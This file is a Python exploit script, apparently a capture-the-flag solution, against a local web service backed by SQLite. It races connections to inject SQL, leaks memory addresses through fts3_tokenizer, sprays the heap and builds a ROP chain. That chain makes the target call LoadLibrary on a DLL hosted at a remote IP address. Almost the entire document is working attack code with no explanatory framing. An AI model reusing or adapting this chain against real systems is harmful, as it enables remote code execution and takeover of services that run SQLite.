import socket
import time
import requests
import struct


port = 14208

p64 = lambda x: struct.pack("<Q", x)

def C(x):
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect(x)
   return s

def injection(query, keyword, suffix=''):
   def oracle():
      r = requests.get('http://localhost:14208/search?userid=1&search=' + keyword)
      print r.text
      if r.text.strip() != 'Nope':
         return r.text
      else:
         return
   pay1 = "PUT /register?id="+"*"*64+"&pw="+"b"*1+" HTTP/1.1\r\n" + suffix
   pay2 = "GET /search?userid=1&search="+"*"*70+"aaa',1);" + query.replace(' ', '%20').replace('\n', '') + "--"+" HTTP/1.1\r\n"

   r = oracle()
   if r:
      return r

   print 'Executing :', len(query)
   print query

   #s3.connect(('localhost',port))
   #s4.connect(('localhost',port))
   while True:
      S = []
      for i in range(16):
         s1 = C(('localhost',port))
         s2 = C(('localhost',port))
         s1.send(pay1.ljust(1024, '\x00') * 100)
         s2.send(pay2.ljust(1024, '\x00') * 100)
         S += [s1, s2]
      #s3.send(pay1)
      #s4.send(pay2)
      time.sleep(3)
      r = oracle()
      if r:
         return r

heap = injection('''
create virtual table a using fts3(b);
insert into a values(x'');
INSERT INTO chat_table VALUES(1,'l',(select hex(a||fts3_tokenizer('simple')) from a));
''', 'l')
heap, base = struct.unpack("<QQ", heap.decode('hex'))

print hex(heap)
print hex(base)

base = base - 0x15A688

count = 0x100000
spray = base + 0xda6ac

injection('''
PRAGMA soft_heap_limit=%d;
insert into chat_table VALUES(1,'S',1);
''' % spray, 'S')

spray_ptr = struct.pack("<Q", base + 0x190898 - 8)

rsp = base + (0x00000200000db6ac - 0x20000001000) #: add rsp, 0x1030 ; pop rdi ; ret
rax = base + (0x000002000000d47d - 0x20000001000) #: pop rax ; ret
rcx = base + (0x000002000002d356 - 0x20000001000) #: pop rcx ; ret
rdx = base + (0x0000020000012563 - 0x20000001000) #: pop rdx ; ret
write = base + (0x00000200000aeacd - 0x20000001000) #: mov qword ptr [rax + 0x10], rcx ; ret
#myip = '\\\\192.168.117.144\\\\aaaaaaaaa.dll'
myip = '\\\\192.168.117.144\\\\bbbbbbbbb.dll'


load_extension = base + 0x00000001801588B0
load_library = base + 0x00000001800F6CBE - 0x180000000

rdi = 0x4141414141414141
rop  = p64(rax) + p64(heap)
rop += p64(rcx) + myip[:8]
rop += p64(write)

rop += p64(rax) + p64(heap+0x8)
rop += p64(rcx) + myip[8:16]
rop += p64(write)

rop += p64(rax) + p64(heap+0x10)
rop += p64(rcx) + myip[16:24]
rop += p64(write)

rop += p64(rax) + p64(heap+0x18)
rop += p64(rcx) + myip[24:]
rop += p64(write)

rop += p64(rcx) + p64(heap+0x10)
rop += p64(load_library)

rop += p64(0x4242424242424242)

trigger = injection('''
select fts3_tokenizer('simple', x'%s');
create virtual table b using fts3(c);
''' % spray_ptr.encode('hex'), 'crash', '\x00' * 7 + p64(rdi) + rop)